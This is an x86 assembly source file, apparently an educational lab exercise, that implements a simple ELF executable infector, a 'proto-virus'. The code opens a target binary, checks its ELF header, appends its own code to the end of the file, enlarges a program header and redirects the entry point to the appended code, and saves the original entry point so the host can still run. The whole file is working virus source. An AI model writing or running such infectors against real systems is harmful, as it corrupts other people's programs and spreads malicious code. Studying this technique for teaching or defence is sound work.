%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define SEEK_CURR 1

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define EI_MAG0		0		; File identification byte 0 index 
%define ELFMAG0		0x7f		; Magic number byte 0 

%define EI_MAG1		1		; File identification byte 1 index 
%define ELFMAG1		'E'		; Magic number byte 1 

%define EI_MAG2		2		; File identification byte 2 index 
%define ELFMAG2		'L'		; Magic number byte 2 

%define EI_MAG3		3		; File identification byte 3 index 
%define ELFMAG3		'F'		; Magic number byte 3 

%define elfHeaderSize 52


	
	global _start

	section .text
_start:
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES	           ; Set up ebp and reserve space on the stack for local storage
	call get_my_loc                      ; find OutStr address in run time, ecx <-- next_i
    mov  edx, next_i                      ;edx get next_i address
    sub  edx, virusMsg                    ;edx get next_i - virusmsg
    sub  ecx, edx     					  ;ecx get next_i-(next_i-virusmsg) = real address of virusmsg	
	write 1 ,ecx,17
	open FileName,RDWR,0x700
	mov [ebp-4] , eax ; ebp-4 is fd
	cmp dword eax, 0
	jl FailedExit
	mov ebx,ebp
	sub ebx,8
	read eax,ebx,4 ;ebx=ebp-8 is the buffer 
 	cmp byte [ebp-8+EI_MAG0], ELFMAG0
 	jnz FailedExit
	cmp byte [ebp-8+EI_MAG1] , ELFMAG1
	jnz FailedExit
	cmp byte [ebp-8+EI_MAG2] , ELFMAG2
	jnz FailedExit
	cmp byte [ebp-8+EI_MAG3] , ELFMAG3
	jnz FailedExit
	lseek [ebp-4],0,SEEK_END 
	mov [ebp-8] , eax ;ebp-8  is the size of file
	write [ebp-4],_start, virus_end - _start  ;write virus to end of file
	lseek [ebp-4],0,SEEK_SET
	mov ebx,ebp
	sub ebx,60 ; allocate 52 bites buffer start from ebp-8. buffer in ebx-60
	read [ebp-4] ,ebx, 52 ; read header to the buffer
	mov esi,[ebp-60+ENTRY] 
	mov [ebp-64] , esi ;ebp-64 is previous entry(for backup)
	mov eax,[ebp-60+PHDR_start]
	lseek [ebp-4] , eax , SEEK_SET
	mov ebx,ebp
	sub ebx,96 ; 64 + 32(pheader size)
	read [ebp-4] , ebx , PHDR_size ;[ebp-96] is first program header
	mov esi,[ebp-96+PHDR_vaddr] 
	mov [ebp-100] , esi ;ebp-100 is first header virtual address
	mov ebx,ebp
	sub ebx,132 ; 100+32 (second pheader size)
	read [ebp-4] , ebx , PHDR_size ; ebp-132 is second program header

	mov esi,[ebp-8] ; fileSize
	mov edx, virus_end-_start ;virusize
	add esi,edx
	mov edi , [ebp-132+PHDR_offset] ; edi is program header offset
	sub esi , edi ; esi is filesize+virusSize-second header offset   
	mov [ebp-132+PHDR_memsize] , esi 
	mov [ebp-132+PHDR_filesize] , esi 
	lseek [ebp-4], -32 , SEEK_CURR          ; bring file location to beginning of second phdr
	mov ebx, ebp
    sub ebx, 132                        
    write [ebp-4], ebx, PHDR_size ; write back the second phdr
	mov eax, [ebp-132+PHDR_vaddr] ; eax <-- second PHDR_vaddr
    add eax, [ebp-8]                    ; eax <-- second PHDR_vaddr + infected file size
    sub eax, [ebp-132+PHDR_offset]      ; eax <-- second PHDR_vaddr + infected file size - second PHDR_offset
    mov [ebp-60+ENTRY], eax             ; ehdr.entry <-- second PHDR_vaddr + second PHDR_filesize - second PHDR_offset
	;mov eax,[ebp-8] ;eax is size of original file
	;add eax,0x08048000 ; eax is load location
	lseek [ebp-4],0,SEEK_SET
	mov ebx,ebp
	sub ebx,60
	write [ebp-4] , ebx , 52
	lseek [ebp-4], 0, SEEK_SET
	lseek [ebp-4],-4,SEEK_END ; mov to last 4 bites of virus code in the end of the file
	mov ebx,ebp
	sub ebx,64
	write [ebp-4] , ebx , 4
	close [ebp-4]
	
	








VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	FailedExit:
	call get_my_loc
	sub ecx, next_i - PreviousEntryPoint
	jmp [ecx]
Failed:
	 exit 1
get_my_loc:
        call next_i
next_i:
        pop ecx
        ret
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
virusMsg:		db "this is a virus!", 10, 0
errorMsg:		db "error", 10, 0

	
PreviousEntryPoint: dd VirusExit





virus_end:
